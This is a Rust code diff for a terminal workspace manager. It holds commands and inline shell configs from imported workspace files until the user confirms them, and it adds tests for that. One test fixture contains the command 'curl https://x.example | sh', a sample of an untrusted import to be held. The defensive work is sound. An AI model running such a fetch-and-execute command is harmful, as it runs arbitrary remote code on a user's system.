@@ -9,6 +9,7 @@ use super::config::{
     WorkspaceLayoutNode, WorkspaceStore, WorkspaceSummary, WorkspaceTabDef, WorkspaceTabGroupDef,
 };
 use super::connection_refs::{ConnectionRefMap, RefLookup};
+use super::import_trust::{collect_untrusted_tabs, mark_groups_untrusted};
 use super::settings::{ActiveWorkspaceInfo, WorkspaceSettings};
 use super::storage::WorkspaceStorage;
 use crate::connection::id_changes::ConnectionIdRemap;
@@ -40,6 +41,17 @@ fn normalize_settings(definition: &mut WorkspaceDefinition) -> Result<(), Termin
 }
 
 impl WorkspaceManager {
+    /// An empty manager whose storage lives in `dir` (tests outside this module).
+    #[cfg(test)]
+    pub(crate) fn new_test(dir: &std::path::Path) -> Self {
+        Self {
+            store: Mutex::new(WorkspaceStore::default()),
+            storage: WorkspaceStorage::new_test(dir),
+            recovery_warnings: Mutex::new(Vec::new()),
+            active_id: Mutex::new(None),
+        }
+    }
+
     /// Initialize from disk, with recovery on corruption.
     pub fn new(app_handle: &AppHandle) -> Result<Self> {
         let storage =
@@ -368,6 +380,7 @@ impl WorkspaceManager {
 
         let mut count = 0;
         let mut warnings: Vec<String> = Vec::new();
+        let mut untrusted_tabs = Vec::new();
         for entry in data.workspaces {
             // Skip if a workspace with the same name already exists
             if store.workspaces.iter().any(|ws| ws.name == entry.name) {
@@ -411,6 +424,9 @@ impl WorkspaceManager {
                     definition.name
                 ));
             }
+            // An imported file must not decide what runs (#4434): hold every
+            // command and inline connection config until confirmed here.
+            mark_groups_untrusted(&mut definition.tab_groups);
             if let Some(resolver) = &resolver {
                 let what = format!("imported workspace \"{}\"", definition.name);
                 crate::connection::plugin_type_ids::migrate_tab_groups(
@@ -428,6 +444,10 @@ impl WorkspaceManager {
             let ws_warnings =
                 record_dangling_ref_warnings(&definition.name, unresolved, &self.recovery_warnings);
             warnings.extend(ws_warnings);
+            untrusted_tabs.extend(collect_untrusted_tabs(
+                &definition.name,
+                &definition.tab_groups,
+            ));
 
             store.workspaces.push(definition);
             count += 1;
@@ -440,6 +460,7 @@ impl WorkspaceManager {
         Ok(WorkspaceImportResult {
             imported_count: count,
             warnings,
+            untrusted_tabs,
         })
     }
 
@@ -454,10 +475,22 @@ impl WorkspaceManager {
             .flat_map(|ws| ws.tab_groups.iter())
             .map(|g| count_tabs(&g.layout))
             .sum();
+        let workspace_count = data.workspaces.len();
+
+        let untrusted_tabs = data
+            .workspaces
+            .into_iter()
+            .flat_map(|ws| {
+                let mut groups = ws.tab_groups;
+                mark_groups_untrusted(&mut groups);
+                collect_untrusted_tabs(&ws.name, &groups)
+            })
+            .collect();
 
         Ok(WorkspaceImportPreview {
-            workspace_count: data.workspaces.len(),
+            workspace_count,
             total_tab_count,
+            untrusted_tabs,
         })
     }
 }
@@ -855,6 +888,8 @@ mod tests {
                         agent_ref: None,
                         title: None,
                         initial_command: None,
+                        pending_initial_command: None,
+                        inline_config_unconfirmed: false,
                     }],
                 },
             }],
@@ -880,6 +915,8 @@ mod tests {
                             agent_ref: None,
                             title: None,
                             initial_command: None,
+                            pending_initial_command: None,
+                            inline_config_unconfirmed: false,
                         }],
                     },
                 },
@@ -894,6 +931,8 @@ mod tests {
                             agent_ref: None,
                             title: None,
                             initial_command: None,
+                            pending_initial_command: None,
+                            inline_config_unconfirmed: false,
                         }],
                     },
                 },
@@ -965,6 +1004,8 @@ mod tests {
                                 agent_ref: None,
                                 title: None,
                                 initial_command: None,
+                                pending_initial_command: None,
+                                inline_config_unconfirmed: false,
                             }],
                         },
                         WorkspaceLayoutNode::Leaf {
@@ -974,6 +1015,8 @@ mod tests {
                                 agent_ref: None,
                                 title: None,
                                 initial_command: None,
+                                pending_initial_command: None,
+                                inline_config_unconfirmed: false,
                             }],
                         },
                     ],
@@ -1234,6 +1277,142 @@ mod tests {
         let preview = WorkspaceManager::preview_import_json(json).unwrap();
         assert_eq!(preview.workspace_count, 2);
         assert_eq!(preview.total_tab_count, 5); // 2 + 2 + 1
+        assert!(preview.untrusted_tabs.is_empty());
+    }
+
+    const UNTRUSTED_IMPORT: &str = r#"{
+        "version": "1",
+        "workspaces": [{
+            "name": "Imported",
+            "tabGroups": [{
+                "name": "Main",
+                "layout": { "type": "leaf", "tabs": [
+                    { "title": "Build", "initialCommand": "curl https://x.example | sh" },
+                    { "inlineConfig": { "type": "local", "config": { "shell": "/bin/zsh" } },
+                      "inlineConfigUnconfirmed": false },
+                    { "connectionRef": "a" }
+                ] }
+            }]
+        }]
+    }"#;
+
+    fn first_leaf(ws: &WorkspaceDefinition) -> &[WorkspaceTabDef] {
+        match &ws.tab_groups[0].layout {
+            WorkspaceLayoutNode::Leaf { tabs } => tabs,
+            WorkspaceLayoutNode::Split { .. } => panic!("expected leaf"),
+        }
+    }
+
+    /// #4434: an imported `initialCommand` is held as pending (never typed
+    /// automatically) and an inline config is flagged unconfirmed, whatever
+    /// the file claims.
+    #[test]
+    fn import_holds_commands_and_inline_configs_until_confirmed() {
+        let dir = TempDir::new().unwrap();
+        let mgr = create_test_manager(&dir);
+
+        let result = mgr
+            .import_json(UNTRUSTED_IMPORT, &ConnectionRefMap::default())
+            .unwrap();
+        assert_eq!(result.imported_count, 1);
+        assert_eq!(result.untrusted_tabs.len(), 2);
+        assert_eq!(
+            result.untrusted_tabs[0].command.as_deref(),
+            Some("curl https://x.example | sh")
+        );
+        assert_eq!(result.untrusted_tabs[0].tab_title.as_deref(), Some("Build"));
+        assert_eq!(
+            result.untrusted_tabs[1].connection_type.as_deref(),
+            Some("local")
+        );
+        assert!(result.untrusted_tabs[1].spawns_local_process);
+
+        let id = mgr.get_workspaces().unwrap()[0].id.clone();
+        let ws = mgr.load_workspace(&id).unwrap();
+        let tabs = first_leaf(&ws);
+        assert_eq!(tabs[0].initial_command, None);
+        assert_eq!(
+            tabs[0].pending_initial_command.as_deref(),
+            Some("curl https://x.example | sh")
+        );
+        assert!(tabs[1].inline_config_unconfirmed);
+        assert!(!tabs[2].inline_config_unconfirmed);
+        assert_eq!(tabs[2].pending_initial_command, None);
+    }
+
+    /// #4434: a duplicate-named workspace is skipped, so its tabs are not listed.
+    #[test]
+    fn import_result_lists_only_workspaces_actually_imported() {
+        let dir = TempDir::new().unwrap();
+        let mgr = create_test_manager(&dir);
+        mgr.save_workspace(sample_definition("ws-1", "Imported"))
+            .unwrap();
+        let result = mgr
+            .import_json(UNTRUSTED_IMPORT, &ConnectionRefMap::default())
+            .unwrap();
+        assert_eq!(result.imported_count, 0);
+        assert!(result.untrusted_tabs.is_empty());
+    }
+
+    /// #4434: the preview lists the same tabs without importing anything.
+    #[test]
+    fn preview_lists_untrusted_tabs() {
+        let preview = WorkspaceManager::preview_import_json(UNTRUSTED_IMPORT).unwrap();
+        assert_eq!(preview.total_tab_count, 3);
+        assert_eq!(preview.untrusted_tabs.len(), 2);
+        assert_eq!(preview.untrusted_tabs[0].workspace_name, "Imported");
+        assert_eq!(
+            preview.untrusted_tabs[1].connection_target.as_deref(),
+            Some("shell /bin/zsh")
+        );
+    }
+
+    /// #4434: a workspace created or edited locally keeps its command as a
+    /// normal `initialCommand`; nothing is held for confirmation.
+    #[test]
+    fn locally_saved_workspace_keeps_its_initial_command() {
+        let dir = TempDir::new().unwrap();
+        let mgr = create_test_manager(&dir);
+        let mut def = sample_definition("ws-1", "Local");
+        if let WorkspaceLayoutNode::Leaf { tabs } = &mut def.tab_groups[0].layout {
+            tabs[0].initial_command = Some("npm start".to_string());
+            tabs[0].inline_config = Some(serde_json::json!({"type": "local", "config": {}}));
+        }
+        mgr.save_workspace(def).unwrap();
+
+        let ws = mgr.load_workspace("ws-1").unwrap();
+        let tabs = first_leaf(&ws);
+        assert_eq!(tabs[0].initial_command.as_deref(), Some("npm start"));
+        assert_eq!(tabs[0].pending_initial_command, None);
+        assert!(!tabs[0].inline_config_unconfirmed);
+    }
+
+    /// #4434: re-importing your own export holds the commands again, so a
+    /// workspace file shared between machines always asks on each machine.
+    #[test]
+    fn export_then_import_holds_local_commands() {
+        let dir = TempDir::new().unwrap();
+        let mgr = create_test_manager(&dir);
+        let mut def = sample_definition("ws-1", "Local");
+        if let WorkspaceLayoutNode::Leaf { tabs } = &mut def.tab_groups[0].layout {
+            tabs[0].initial_command = Some("npm start".to_string());
+        }
+        mgr.save_workspace(def).unwrap();
+        let json = mgr.export_json(&ConnectionRefMap::default()).unwrap().json;
+
+        let dir2 = TempDir::new().unwrap();
+        let mgr2 = create_test_manager(&dir2);
+        let result = mgr2
+            .import_json(&json, &ConnectionRefMap::default())
+            .unwrap();
+        assert_eq!(result.untrusted_tabs.len(), 1);
+        let id = mgr2.get_workspaces().unwrap()[0].id.clone();
+        let ws = mgr2.load_workspace(&id).unwrap();
+        assert_eq!(first_leaf(&ws)[0].initial_command, None);
+        assert_eq!(
+            first_leaf(&ws)[0].pending_initial_command.as_deref(),
+            Some("npm start")
+        );
     }
 
     #[test]
@@ -1472,6 +1651,8 @@ mod tests {
                         agent_ref: None,
                         title: None,
                         initial_command: None,
+                        pending_initial_command: None,
+                        inline_config_unconfirmed: false,
                     }],
                 },
                 WorkspaceLayoutNode::Leaf {
@@ -1481,6 +1662,8 @@ mod tests {
                         agent_ref: None,
                         title: None,
                         initial_command: None,
+                        pending_initial_command: None,
+                        inline_config_unconfirmed: false,
                     }],
                 },
             ],
